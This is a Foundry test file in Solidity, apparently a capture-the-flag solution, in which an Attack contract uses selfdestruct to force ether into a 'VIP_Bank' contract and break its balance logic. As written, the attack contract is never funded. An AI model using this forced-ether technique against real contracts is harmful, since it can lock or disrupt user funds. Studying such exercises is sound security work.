// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/VIPBank.sol";

contract BankTest is Test {
    VIP_Bank bank;
    Attack attackContract;

    address manager = makeAddr("MANAGER");
    address hacker = makeAddr("HACKER");

    function setUp() external {
        vm.prank(manager);
        bank = new VIP_Bank();
        attackContract = new Attack(address(bank));
    }

    function test_Destory() external {
        vm.prank(hacker);
        attackContract.attack();
    }
}

contract Attack {
    VIP_Bank bank;

    constructor(address _addr) {
        bank = VIP_Bank(_addr);
    }

    function attack() external {
        address payable destuctor = payable(address(bank));
        selfdestruct(destuctor);
    }
}